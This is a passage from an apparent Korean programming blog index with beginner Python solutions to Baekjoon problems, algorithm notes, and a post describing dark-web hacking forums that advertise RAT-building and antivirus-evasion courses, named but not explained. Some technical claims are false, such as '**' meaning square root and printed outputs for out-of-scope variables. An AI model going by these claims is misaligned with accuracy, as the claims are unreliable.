input().split())print(f'{a+b}\\n{a-b}\\n{a*b}') 1271번 문제풀이 방식으로 문제 풀이를 하였다. 이렇게 제출해도 정답으로 인정 받지만, 예제 입력을 보면 한 줄이 아닌 두 줄로 입력을 하고 있다. 이점을 걸리신 분들은 다음과 같은 방식으로 코드를 수정하면 된다. 12a, b = map(int, open(0))print(f'{a+b}\\n{a-b}\\n{a*b}') 이 방식은 정해진 변수에 계속 입력을 받을 수 있고, stdout방식이 아닌 EOF방식으로 출력이 된다.stdout방식과 EOF방식이 무엇일까?두 개의 방식을 설명하기 앞서 선행되어야 하는 것이 입출력이 무엇인지를 알아야한다. 입출력쉽게 말해 프로그램에게 데이터를 주는 것이 입력이고, 데이터를 모니터로 보여주게 하는 것이 출력이다. 스트림우리가 데이터를 입력할 때 주로 무엇을 사용할까요? 바로 키보드와 마우스입니다.키보드와 마우스를 사용하여 프로그램에게 데이터를 전달해야하는데 전달해주는 것이 바로 **표준 입력 스트림(stdin)**입니다. 프로그램에서 모니터, 프린터로 전달하는 것은 **표준 출력 스트림(stdout)**이라고 합니다. 이 외에도 오류 출력용인 **표준 에러 스트림(stderr)**가 있습니다. 이것들은 input함수, print함수를 사용하면 생성이되고 입력과 출력이 끝나면 자동으로 종료가 됩니다. EOFEOF(End Of File)은 더 이상 데이터가 없음을 의미합니다.왜 open(0)은 EOF방식 출력이라고 제가 표현 했을까요? open(0)은 입력 받는 것이 무한 반복 하기 때문입니다.그 때문에 프로그램에게 EOF을 알려 줘야 무한 입력이 끝나고, 값이 출력될 수 있기 때문에 EOF방식 출력이라고 표현했습니다. – 출론 –그럼 왜 open(0)이 무한 입력이 될까요?open함수는 파일을 읽기 위해 주로 사용되는 함수입니다. 즉, 파일 입력 함수이죠.open함수의 대표적인 인자값은 open(file, mode)입니다.그런데 파일이 0이다? open함수 입장에서는 읽을 데이터가 없으니 직접 데이터를 입력하라고 입력창을 띄어주는 것 같습니다. 이에 대해서는 python의 open함수 코드를 열어봐서 분석할 예정입니다.","link":"/2020/11/08/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-2338%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 2475번 문제","text":"백준 2475번 문제검증수link : https://www.acmicpc.net/problem/2475 12a, b, c, e, f = map(int, input().split())print((a**2 + b**2 + c**2 + e**2 + f**2)%10) **은 제곱근을 의미한다. a**2 =&gt; a^2를 의미 위 코드를 python스럽게 변경해보자. 1print( sum( a**2 for a in map(int, input().split()) )%10 ) 보기 좋게 한 줄로 표현이 되었다.근데 이상하게 print함수 안에 for문이 들어가 있다.이 형식은 제너레이터 표현라고 한다. itertorlink : https://bluese05.tistory.com/55 itertor - 제너레이터 - 제너레이터 표현 순으로 봐야 좀 더 이해가 쉽다. itertor은 next 메소드로 데이터를 순차적으로 호출 가능한 object이다. 12345678x = [1, 2, 3]print(type(x), '\\n') # &lt;class 'list'&gt; 출력y = iter(x)print(type(y), '\\n') #&lt;class 'list_iterator'&gt; for i in range(4): print(next(y)) # 1 2 3 출력 이와 같이 iter함수를 사용하여 iterator 형식으로 변환할 수 있다.하지만 우리는 반복문을 쓸 때 next 메소드를 쓴 적이 없다.이유는 파이썬 내부에서 임시로 list를 iterator로 자동 변환해주기 때문이다. generatorlink : https://bluese05.tistory.com/56 제너레이터는 iterator를 반환하는 함수이다.제너레이터는 일반적인 함수와 비슷하게 보이지만, 차이점이 있다.yield라는 존재가 그 차이점이다. 12345678910111213141516171819202122232425def ex(n): i = 0 while i &lt; n: yield i i += 1 while i &gt; n: yield print(i, 'no!!') break return idef test(): a = 10000 return aprint(*ex(-2), '\\n') # 0 no!!# None 출력print(*ex(3), '\\n') # 0 1 2 출력 print(i, '\\n') # 3 출력print(test()) # 10000 출력print(a) # 0 출력 yield함수가 끝나면 함수 안의 변수들은 메모리 상에서 clear된다.하지만 yield를 사용한 경우는 다른 형식으로 흘려간다.함수에서 yield를 만나면, 해당 함수는 그 상태로 정지가 되어 next 메소드를 호출한 쪽으로 yield를 전달하게 된다.이 후 해당 함수는 종료되는 것이 아니라, 함수 내부 데이터가 메모리에 그대로 유지하고 실행된다. 위의 예제 코드에서 ex함수가 종료되어도 ex함수의 i 변수의 데이터가 메모리에 남아 있는 것을 알 수 있다. generator expreession제너레이터 표현은 제너레이터를 쉽게 사용할 수 있도록 해준다.list comprehension과 비슷하지만, [] 대신 ()를 사용하면 된다. 1234567891011121314151617s = [1,2,3,4,5]print('--list comprehension--')[print(i) for i in s]print('\\n')# --list comprehension--# 1# 2# 3# 4# 5 출력print('--generator expreession--')(print(i) for i in s)# --generator expreession--# &lt;generator object &lt;genexpr&gt; at 0x113b3a890&gt; 출력 복잡한데 왜 사용할까?사용하는 이유는 성능 때문이다. 일반적인 for문을 돌리는 것보다 generator expreession과 list comprehension형식으로 돌리는게 속도와 메모리가 성능이 좋다. 다른 방식들도 있는데 이는 밑의 링크를 참고하면 된다.link : https://mingrammer.com/introduce-comprehension-of-python/","link":"/2020/11/10/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-2475%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 2557 &amp; 2558번 문제","text":"백준 2557번 문제Hello Worldlink : https://www.acmicpc.net/problem/2557 1print('Hello World!') 백준 2558번 문제A+B - 2link : https://www.acmicpc.net/problem/2558 1print(sum(a for a in map(int, input().split()))) 1print(sum(map(int, open(0)))) 각각 코드는 2475번, 2338번 문제 코드를 활용하여 문제 풀이를 하였다.","link":"/2020/11/13/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-2557%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 2845번 문제","text":"백준 2845번 문제파티가 끝나고 난 뒤link : https://www.acmicpc.net/problem/2845 123a = [b for b in map(int, open(0))]c = a[0]*a[1]print(a[2]-c, a[3]-c, a[4]-c, a[5]-c, a[6]-c) 2338번 문제 풀이를 응용하여 풀이를 하였다.하지만 python스러운 코드는 아니다. 좀 더 변경하겠다. 1234r = lambda : map(int, input().split())A,B = r()[print(x-A*B) for x in r()] lambda함수를 이용하여 python스럽게 코드를 수정하였다. lambdalink : https://wikidocs.net/24#lambda lambda함수는 쉽게 말하면 함수와 동일한 역할을 한다. 12345def 프린트입니다(a): return print(a)s = '함수를 사용하는 겁니다.'프린트입니다(s) # 함수를 사용하는 겁니다. 출력 123test = lambda a: print(a)s = 'lambda를 사용하는 겁니다.'test(s) # lambda를 사용하는 겁니다. 이와 같이 구현이 가능하다.주로 lambda는 함수를 구현할 정도로 복잡하지 않거나 함수를 사용할 수 없는 곳에 주로 쓰인다.","link":"/2020/11/13/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-2845%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 2914번 문제","text":"백준 2914번 문제저작권Link : https://www.acmicpc.net/problem/2914 12a, b = map(int, input().split())print(a * (b-1) + 1) b는 반올림이 되었다고 하니 -1를 해주고, a와 곱해집니다.그 후 +1를 하는데 그 이유는 잘 모르겠다.예제 출력을 보고 +1를 해줬는데 그게 정답이였다. 이 이분은 알아보고 수정하겠다.","link":"/2020/12/04/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-2914%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 3003번 문제","text":"백준 3003번 문제킹, 퀸, 룩, 비숍, 나이트, 폰Link : https://www.acmicpc.net/problem/3003 1234a = [1, 1, 2, 2, 2, 8]b = list(map(int, input().split()))print( *[a[i]-b[i] for i in range(6)] ) 2475번 문제 풀이를 유용했으나 좀 부족하다.그래서 python스럽게 변경하겠다. 1print( *[ int(j) - int(i) for i, j in zip(input().split(),&quot;112228&quot;) ] ) 문자열 자료형Link : https://wikidocs.net/13 왜 for문에 문자열을 넣었는지 이해가 안된다면, 점프 투 파이썬을 참고하면 된다.읽어보면 파이썬이 문자열에서 지원하는 기능을 보면 리스트와 별 차이가 없다는 것을 알 수 있다. 1[print(i) for i in '112228'] zipLink : https://wikidocs.net/32#zip 12a = zip([1, 2, 3], [4, 5, 6])print(*a) # 출력 : (1, 4) (2, 5) (3, 6) 이와 같이 zip은 동일한 개수로 이루어진 자료형을 묶어 주는 함수이다.이것을 이용하여 문제 풀이에선 체스 말의 개수와 사용자 입력 값을 하나씩 묶어서 변수에 넣어 줄 수 있었다. 123456789for i, j in zip(input().split(), '112228'): print('체스말 : ', i, '사용자 입력 : ', j)# 체스말 : 0 사용자 입력 : 1# 체스말 : 1 사용자 입력 : 1# 체스말 : 2 사용자 입력 : 2# 체스말 : 2 사용자 입력 : 2# 체스말 : 2 사용자 입력 : 2# 체스말 : 7 사용자 입력 : 8","link":"/2020/12/04/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-3003%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 3046번 문제","text":"백준 3046번 문제R2Link : https://www.acmicpc.net/problem/3046 12a, b = map(int, input().split())print(2*b - a) 간단하게 문제 풀이를 했으나, 역시 좀 아쉽다.좀 더 python스럽게 변경하였다. 1print(-eval(input().replace(&quot; &quot;,&quot;-2*&quot;))) replaceLink : https://wikidocs.net/13#replace 12s = 'Hi! _님'print(s.replace('_', 'LRTK')) # 출력 : Hi! LRTK님 이와 같이 특정 단어를 치환해주는 것이 replace함수이다.위 문제 풀이에선 입력된 ‘11 15’을 ‘11-2*15’로 변환하여 eval함수를 사용하여 계산하였다. eval함수는 정리한 부분은 백준 브론즈5 1000번 문제에서 다루었으니 궁금하면 찾아서 보면 된다.","link":"/2020/12/04/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-3046%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 5337번 문제","text":"백준 5337번 문제웹컴Link : https://www.acmicpc.net/problem/5337 1print('. . .\\n| | _ | _. _ ._ _ _\\n|/\\|(/.|(_.(_)[ | )(/.') 이 문제는 파이썬을 처음 접한 분에게 파이썬의 print 주의점을 알려주기 위한 문제로 파악이 된다. 123# \\nsi 출략print('\\nsi') # 출력 : siprint('\\\\nsi') # 출력 : \\nsi 파이썬에서는 \\를 출력하기 위해 \\\\로 변경해줘야 한다.이러한 이유는 위의 코드처럼 ‘\\n’과 같은 특수 문자와 구별하려고 이러한 방법을 사용한다.","link":"/2020/12/04/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-5337%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 실버 10814번 문제","text":"나이순 정렬온라인 저지에 가입한 사람들의 나이와 이름이 가입한 순서대로 주어진다. 이때, 회원들을 나이가 증가하는 순으로, 나이가 같으면 먼저 가입한 사람이 앞에 오는 순서로 정렬하는 프로그램을 작성하시오. 문제풀이1123456789n = int(input())data = []for _ in range(n): x, y = input().split() data.append((int(x), y))for a, b in sorted(data, key=lambda x: x[0]): print(a, b) 풀이1 설명간단하게 sorted 함수를 이용하여 정렬하였다. 이때 key 속성을 지정하여 나이로 정렬 될 수 있게 설정하였다. 하지만 여기서 큰 문제가 있으니, 바로 실행 시간이 엄청 많이 나온다는 것이다. 문제가 for문 안에 있는 input() 함수가 문제인 것으로 판단되어 sys 모듈의 stdin으로 변경하였다. 문제풀이21234567891011import sysn = int(input())data = []for _ in range(n): x, y = sys.stdin.readline().split() data.append((int(x), y))for i in sorted(data, key=lambda x: x[0]): print(i[0], i[1]) 풀이2 설명문제풀이1에서 for문 안의 input 함수를 sys.stdin.readline 함수로 변경하였다. 실행 시간이 확 줄어진 것을 볼 수 있다.","link":"/2021/03/02/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-10814%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 실버 10989번 문제","text":"수 정렬하기3N개의 수가 주어졌을 때, 이를 오름차순으로 정렬하는 프로그램을 작성하시오. 문제풀이112345678910111213import sysn = int(input())data = [0] * 10001for _ in range(n): d = int(sys.stdin.readline()) data[d] += 1for i in range(10001): if data[i] != 0: for j in range(data[i]): print(i) 풀이1 설명문제의 조건을 보면 시간 제한은 3초, 메모리 제한은 8MB이다. 즉, 시간 복잡도/공간 복잡도를 생각을 해야하는 문제이다. 입력의 조건을 보면, 0 &lt;= m(입력되는 수) &lt;= 10,000이라는 조건이 있다.그리고 이 어마무시한 입력값들이 최대 10,000,000이 주어진다는게 큰 문제이다. 이러한 수 많은 값들이 리스트나 튜플로 메모리에 저장하여, 그 리스트나 튜플을 정렬한다고 했을 때 8MB라는 공간을 맞출 수 없다. 그래서 리스트의 인덱스을 입력되는 수라고 생각하고, 해당 자리의 값을 +1을 해준다. 위 사진과 같이 효율적으로 저장한다면, 총 5개의 데이터가 저장이 된다.만약 입력값을 그냥 리스트로 저장한다고 하면 총 9개의 데이터가 저장이 되니, 훨씬 효율적이다. 이를 위해서 입력되는 값이 최대입력값과 최소입력값을 알아야 하고, 그 크키 만큼 리스트를 선언을 해줘야한다.그래서 [0] * 10001이라는 0부터 10000까지의 공간을 리스트로 만든 것이다. 하지만 마지막 출력을 위한 이중 for문이 있어서 시간이 좀 걸린 것이 걸렸다. 이를 수정하였다. 문제 풀이2123456789101112import sysn = int(input())data = [0] * 10001for _ in range(n): d = int(sys.stdin.readline()) data[d] += 1for i in range(10001): if data[i] != 0: print(f'{i}\\n' * data[i], end='') 풀이2 설명 이중 for문에서 for문으로 변경하니, 훨씬 시간이 절약되는 것을 확인 할 수 있다.","link":"/2021/03/02/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-10989%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 실버 11650번 문제","text":"좌표 정렬하기2차원 평면 위의 점 N개가 주어진다. 좌표를 x좌표가 증가하는 순으로, x좌표가 같으면 y좌표가 증가하는 순서로 정렬한 다음 출력하는 프로그램을 작성하시오. 문제풀이1234567891011import sysn = int(input())data = []for _ in range(n): x, y = sys.stdin.readline().split() data.append((int(x), int(y)))for i in sorted(data): print(i[0], i[1]) 풀이 설명sorted 함수는 자동으로 0번째 값이 같으면 1번째 값으로 정렬한다. 하지만, key 속성을 사용하여 0번째 값을 key로 지정한다면 좀 다르게 정렬한다. 0번째 값이 같으면, 먼저 삽입된 순으로 정렬이 된다. 직접 sorted 함수와 key 속성을 쓴 sorted 함수를 비교하면 구별이 쉬울 것이다.","link":"/2021/03/02/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-11650%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 실버 1920번 문제","text":"수 찾기N개의 정수 A[1], A[2], …, A[N]이 주어져 있을 때, 이 안에 X라는 정수가 존재하는지 알아내는 프로그램을 작성하시오. 문제풀이12345678910n = input()data = {*map(int, input().split())}n2 = input()data2 = [*map(int, input().split())]for _ in data2: if _ in data: print(1) else: print(0) 풀이 설명Set 함수를 이용하여 혹시나 있을 첫번째 데이터인 data 속의 값의 중복 제거 후 data2의 값과 하나씩 비교하여 있으면 1를 출력","link":"/2021/03/01/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-1920%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 실버 1874번 문제","text":"스택 수열스택 (stack)은 기본적인 자료구조 중 하나로, 컴퓨터 프로그램을 작성할 때 자주 이용되는 개념이다. 스택은 자료를 넣는 (push) 입구와 자료를 뽑는 (pop) 입구가 같아 제일 나중에 들어간 자료가 제일 먼저 나오는 (LIFO, Last in First out) 특성을 가지고 있다. 1부터 n까지의 수를 스택에 넣었다가 뽑아 늘어놓음으로써, 하나의 수열을 만들 수 있다. 이때, 스택에 push하는 순서는 반드시 오름차순을 지키도록 한다고 하자. 임의의 수열이 주어졌을 때 스택을 이용해 그 수열을 만들 수 있는지 없는지, 있다면 어떤 순서로 push와 pop 연산을 수행해야 하는지를 알아낼 수 있다. 이를 계산하는 프로그램을 작성하라. 문제풀이11234567891011121314151617181920n = int(input())count = 1stack = []result = []for i in range(1, n+1): data = int(input()) while count &lt;= data: stack.append(count) count += 1 result.append('+') if stack[-1] == data: stack.pop() result.append('-') else: print('NO') exit(0)print('\\n'.join(result)) 풀이1 설명 n : 스택에 저장할 총 갯수 count : 스택에 Push할 값 data : 스택에 Pop할 값 1~n까지 반복을 하는데, 그 속엔 data을 입력 받는다. 하지만 아직 스택엔 아무 값이 없어서 count가 data만큼 같아질 때까지 반복을 하는데 1씩 증가 할 때마다 스택에 넣는다. 그 후 스택의 맨 위가 data와 같은 값이면, pop을 하고 result에 -를 입력한다. 같은 값이 아니면 pop과 push만으로 구현이 안되니 NO를 출력하였다. 문제 풀이212345678910111213141516171819202122import sysn = int(input())data = map(lambda x: int(x.rstrip()), sys.stdin.readlines())count = 1stack = []result = []for i in data: while count &lt;= i: stack.append(count) count += 1 result.append('+') if stack[-1] == i: stack.pop() result.append('-') else: print('NO') exit(0) print('\\n'.join(result)) 풀이2 설명풀이1은 반복문에서 input()로 입력값을 받고 있어서 시간이 많이 소모가 된다. 그래서 readlines()를 이용하여 값을 입력 받아서 저장된 값들을 반복문에서 하나하나 꺼내서 쓰는 방식으로 변경하였다. 그 결과 시간이 대폭 줄었다.","link":"/2021/02/27/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%843-1874%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 실버 1966번 문제","text":"프린터 큐여러분도 알다시피 여러분의 프린터 기기는 여러분이 인쇄하고자 하는 문서를 인쇄 명령을 받은 ‘순서대로’, 즉 먼저 요청된 것을 먼저 인쇄한다. 여러 개의 문서가 쌓인다면 Queue 자료구조에 쌓여서 FIFO - First In First Out - 에 따라 인쇄가 되게 된다. 하지만 상근이는 새로운 프린터기 내부 소프트웨어를 개발하였는데, 이 프린터기는 다음과 같은 조건에 따라 인쇄를 하게 된다. 현재 Queue의 가장 앞에 있는 문서의 ‘중요도’를 확인한다.나머지 문서들 중 현재 문서보다 중요도가 높은 문서가 하나라도 있다면, 이 문서를 인쇄하지 않고 Queue의 가장 뒤에 재배치 한다. 그렇지 않다면 바로 인쇄를 한다.예를 들어 Queue에 4개의 문서(A B C D)가 있고, 중요도가 2 1 4 3 라면 C를 인쇄하고, 다음으로 D를 인쇄하고 A, B를 인쇄하게 된다. 여러분이 할 일은, 현재 Queue에 있는 문서의 수와 중요도가 주어졌을 때, 어떤 한 문서가 몇 번째로 인쇄되는지 알아내는 것이다. 예를 들어 위의 예에서 C문서는 1번째로, A문서는 3번째로 인쇄되게 된다. 문제풀이12345678910111213141516test_case = int(input())for _ in range(test_case): n, m = map(int, input().split()) queue = [(data, idx) for idx, data in enumerate([*map(int, input().split())])] count = 0 while True: if queue[0][0] == max(queue, key=lambda x: x[0])[0]: count += 1 if queue[0][1] == m: print(count) break else: queue.pop(0) else: queue.append(queue.pop(0)) 풀이 설명 몇번을 입력 받을 건가? : test_case Queue 안의 문서 갯수 : n Queue에서 몇번째로 POP되는지 알고자하는 번수 : m Queue 위 4개를 입력받고, 해당 Queue에는 중요도가 저장이 된다. 12345test_case = int(input())for _ in range(test_case): n, m = map(int, input().split()) queue = [*map(int, input().split())] queue = [(data, idx) for idx, data in enumerate(queue)] 문제풀이에선 queue를 한 줄로 표현했으나, 위와 같이 정의할 수도 있다.queue의 값에 index(문서)도 같이 포함을 하여, 몇번째 문서인지를 검사할 수 있도록 하였다. 123456count = 0while True: if queue[0][0] == max(queue, key=lambda x: x[0])[0]: count += 1 else: queue.append(queue.pop(0)) 무한 루프를 이용하여, 중요도가 가장 큰 값이 pop을 할 수 있도록 순회를 하였다. 이렇게 Queue의 특성을 이용하여 풀이를 진행하였다.","link":"/2021/03/01/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%843-1966%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 실버 5397번 문제","text":"키로거창영이는 강산이의 비밀번호를 훔치기 위해서 강산이가 사용하는 컴퓨터에 키로거를 설치했다. 며칠을 기다린 끝에 창영이는 강산이가 비밀번호 창에 입력하는 글자를 얻어냈다. 키로거는 사용자가 키보드를 누른 명령을 모두 기록한다. 따라서, 강산이가 비밀번호를 입력할 때, 화살표나 백스페이스를 입력해도 정확한 비밀번호를 알아낼 수 있다. 강산이가 비밀번호 창에서 입력한 키가 주어졌을 때, 강산이의 비밀번호를 알아내는 프로그램을 작성하시오. 문제 풀이12345678910111213141516171819test_case = int(input())for _ in range(test_case): left_stack, right_stack = [], [] cuser = input() for data in cuser: if data == '&lt;': if left_stack: right_stack.append(left_stack.pop()) elif data == '&gt;': if right_stack: left_stack.append(right_stack.pop()) elif data == '-': if left_stack: left_stack.pop() else: left_stack.append(data) left_stack.extend(reversed(right_stack)) print(''.join(left_stack)) 풀이 설명두 개의 스택을 선언하여, 진짜 커서가 움직이는 것처럼 구현하였다.","link":"/2021/03/01/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%843-5397%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"보안뉴스 - 다크웹 차세대 범죄자 양성","text":"구인구직 활동 늘어나는 다크웹, 차세대 범죄자 육성 중뉴스 내용은 정리하자면, 다크웹에서 해킹조직에서 구인구직이 많이 진행된다는 기사이다. 나는 기사 내용 중 흥미로운 것을 발견할 수 있었다. CryptBB라는 해킹포럼에서 초보자 대상으로 해킹 강좌가 올라와 있다는 내용이다. 그동안 포럼을 떠돌아다녀 봤는데 Dreamhack 사이트처럼 내용이 잘 정리된 글은 거의 보지를 못했다. 주로 궁금한 점을 질문을 하면 답변을 받는 식으로 하는데 Cryptbb는 아예 강좌가 올라와 있다고 한다. 강좌가 어떤 내용으로 이루어져 있는지 궁금하여 직접 CryptBB에 접속하였다. 사이트에서 특이한점이 워게임 사이트처럼 Chaalenges가 있다는 점이다. 또한 포럼의 내용은 Newbie, Programming, Hacking, Darkweb Discussions, Market으로 나누어져 있다. Newbie은 사이트 사용 방법을 모르는 사이트의 Newbie가 질문하는 곳이다. Beginner Programming은 프로그래밍의 초보자들을 위해 만들어진 곳인데 들어가보면 특정 유저가 강좌나 팁들을 올리거나 궁금한 점이 있으면 질문하는 곳이다. Begunner Hacking도 해킹을 위한 곳이다. Programming 강좌를 하나 선택하여 확인을 해보니, 책처럼 자세한 내용을 정리한 것이 아닌 배우면 도움되는 것을 정리하였다. 또한 왜 배워야하는 지에 대한 내용 적혀져 있었다. 특이한 점은 보통 C언어를 배우고 어셈블리어를 배우는데 여기선 어셈블리어를 이해한 다음에 JAVA을 추천하고 있다. 아마 글쓴이의 개인적인 생각인 듯하다. 강좌에서 어셈블리어 공부할 때 도움되는 사이트를 첨부했는데 혹시 공부하실 분은 가서 공부하면 도움이 될 것 같다.101 Computing LMC Challenges Hacking 강좌는 확인해보니 강좌는 없었고, 주로 질문하는 곳이였다. 하지만 실망하지말라 Begunner Hacking을 좀 살펴보니 사이트 하나를 발견할 수 있었다. 바로 HackTown이라는 사이트를 발견할 수 있었다. 이 사이트는 강의를 목적으로 운영하는 사이트이다. 맴버쉽제로 운영되는데 무료 강의도 있었다. 맴버쉽을 가입하면, RAT 제작과 윈도우 디펜더 우회 방법, 쇼단을 이용하여 자신만의 봇넷 생성 등의 강의을 볼 수 있다. 무료 강의 중 하나를 봤는데 재밌는 점이 여기서도 자격증을 취득하는 것이 좋다는 글이 있었다. 또한 되도록이면 자신의 나라에서 범죄 행위를 하지말라는 경고도 있었다. 경고는 미성년자가 해킹을 하여 잡혀간 기사와 다크웹에서 해킹 조직을 구해서 들어가서 해킹을 하다가 잡혀간 기사를 보여주면서 경고한다. 경고하는 이유는 미숙한 실력으로 하지말고 실력을 키운 다음 범죄를 일으키라는 것이니 너무 좋게 보지말자.","link":"/2021/03/04/%EB%B3%B4%EC%95%88%EB%89%B4%EC%8A%A4-%EA%B5%AC%EC%9D%B8%EA%B5%AC%EC%A7%81-%ED%99%9C%EB%8F%99-%EB%8A%98%EC%96%B4%EB%82%98%EB%8A%94-%EB%8B%A4%ED%81%AC%EC%9B%B9-%EC%B0%A8%EC%84%B8%EB%8C%80-%EB%B2%94%EC%A3%84%EC%9E%90-%EC%9C%A1%EC%84%B1-%EC%A4%91/"},{"title":"알고리즘 복잡도","text":"알고리즘 복잡도 계산이 필요한 이유하나의 문제를 푸는 알고리즘은 다양할 수 있음.이 중 어느 알고리즘이 더 뛰어난지 계산이 필요함. 알고리즘 복잡도 계산 항목 시간 복잡도 : 알고리즘 실행 속도 공간 복잡도 : 알고리즘이 사용하는 메모리 사이즈 요즘, 하드웨어가 발전을 하면서 공간 복잡도는 그리 중요하지 않게 된다. 시간 복잡도의 주요 요소반복문이 크게 영향을 끼침. 알고리즘 성능 표기법빅-오 표기법 : O(n) 알고리즘 최악의 실행 시간을 표기 가장 많이/일반적으로 사용함. 아무리 최악의 상황이라도, 빅오의 만큼의 성능은 보장한다는 의미 오메가 표기법 : Ω(n) 오메가 표기법은 알고리즘 최상의 실행 시간을 표기 세타 표기법 : Θ(n) 세타 표기법은 알고리즘 평균 실행 시간을 표기 시간 복잡도 계산은 반복문이 핵심 요소임을 인지하고, 계산 표기는 최상, 평균, 최악 중 최악의 시간인 빅-오 표기법을 중심으로 익히면 됨. 빅-오 표기법 입력 n에 따라 결정되는 시간 복잡도 함수 O(1), O(log n), O(n), O(n log n), O(n^2), O(2^n), O(n!) 등으로 표기함O(1) &lt; O(log n) &lt; O(n) &lt; O(n log n) &lt; O(n^2) &lt; O(2^n) &lt; O(n!) 참고 : log n 의 베이스는 2 - log2 n 단순하게 입력 n에 따라, 몇 번 실행되는지를 계산하면 됨. 표현식에 가장 큰 영향을 미치는 n의 단위로 표기함.ex)3n+10, 3n+10 : O(n)3n2, n2+2 : O(n2) O(1)12if n &gt; 10: print(n) O(n)12for i in range(n): print(i) 3n2 : O(n2)1234for i in range(3): for j in range(n): for k in range(n): print(k)","link":"/2021/02/15/%EC%8B%9C%EA%B0%84-%EB%B3%B5%EC%9E%A1%EB%8F%84/"},{"title":"알고리즘 정리 - 동적 계획법, 분할 정복","text":"정의동적 계획법(Dynamic Programming)입력 크기가 작은 부분 문제들을 해결한 후, 해당 부분 문제의 해를 활용해서, 보다 큰 크기의 부분 문제를 해결, 최종적으로 전체 문제를 해결하는 알고리즘 상향식 접근법으로, 가장 최하위 해답을 구한 후, 이를 저장하고, 해당 결과값을 이용해서 상위 문제를 풀어가는 방식 Memoization 기법을 사용함.Memoization이란? 프로그램 실행 시 이전에 계산한 값을 저장하여, 다시 계산하지 않도록 하여 전체 실행 속도를 빠르게 하는 기술 문제를 잘게 쪼갤 때, 부분 문제는 중복되어, 재활용됨. 분할 정복문제를 나눌 수 없을 때까지 나누어서 각각을 풀면서 다시 합병하여 문제의 답을 얻는 알고리즘 하양식 접근법으로, 상위의 해답을 구하기 위해, 아래로 내려가면서 하위의 해답을 구하는 방식 문제를 잘게 쪼갤 때, 부분 문제는 서로 중복되지 않음. 공통점문제를 잘게 쪼개서, 가장 작은 단위로 분할 차이점 동적 계획법부분 문제는 중복되어, 상위 문제 해결 시 재활용됨.Memoization 기법 사용(부분 문제의 해답을 저장해서 재활용하는 최적화 기법으로 사용) 분할 정복부분 문제는 서로 중보되지 않음.Memoization 기법 사용 안함. 이해동적 계획법 알고리즘 이해 피보나치 수열 1234567fibonacci(0) = 0fibonacci(1) = 1fibonacci(2) = 1fibonacci(3) = 2fibonacci(4) = 3fibonacci(5) = 5fibonacci(6) = 8 Recursive call 활용123456def fibo(num): if num &lt;= 1: return num return fibo(num - 1) + fibo(num - 2)print(fibo(4)) fibo(4)를 구하기 위해선 fibo(3)과 fibo(2)가 필요하다. fibo(3)은 fibo(2) + fibo(1)fibo(2)은 fibo(1) + fibo(0) fibo(4)를 구하기 위해선 fibo(0) 1개, fibo(1) 2개, fibo(2) 1개가 필요한데 이를 계속 계산하여 구하는 것은 비효율적이다. 이 부분을 해결하는 방법이 동적 계획법이다. DP 활용12345678910def fibo_dp(num): cache = [0 for index in range(num+1)] cache[0] = 0 cache[1] = 1 for index in range(2, num+1): cache[index] = cache[index-1] + cache[index-2] return cache[num]print(fibo_dp(4)) 리스트에 피보나치 수열을 계산 값을 저장을 하여 저장된 값을 사용하여 계산하여 효율을 높였다. 분할 정복 알고리즘 이해퀵 정렬 알고리즘 참고","link":"/2021/02/24/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%EB%8F%99%EC%A0%81-%EA%B3%84%ED%9A%8D%EB%B2%95-%EB%B6%84%ED%95%A0-%EC%A0%95%EB%B3%B5/"},{"title":"알고리즘 정리 - 재귀용법","text":"재귀 용법(Recursive Call, 재귀 호출)함수 안에서 동일한 함수를 호출하는 형태 예제팩토리얼을 구하는 알고리즘 2! = 1*2 3! = 1*2*3 4! = 1*2*3*4 n! = n * (n-1)! 1234567def factorial(num): if num &gt; 1: return num * factorial(num-1) else: return numprint(factorial(10)) 시간 복잡도/공간 복잡도는 O(n-1)이므로, O(n)이라는 시간 복잡도/공간 복잡도를 가진다. 일반적인 형태12345def recursive(입력): if 입력 &gt; 일정값: return recursive(입력 또는 특정값) else: return 결과값 파이썬의 경우 재귀함수의 길이는 1000번이 최대이다.","link":"/2021/02/23/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%EC%9E%AC%EA%B7%80%EC%9A%A9%EB%B2%95/"},{"title":"알고리즘 정리 - 버블, 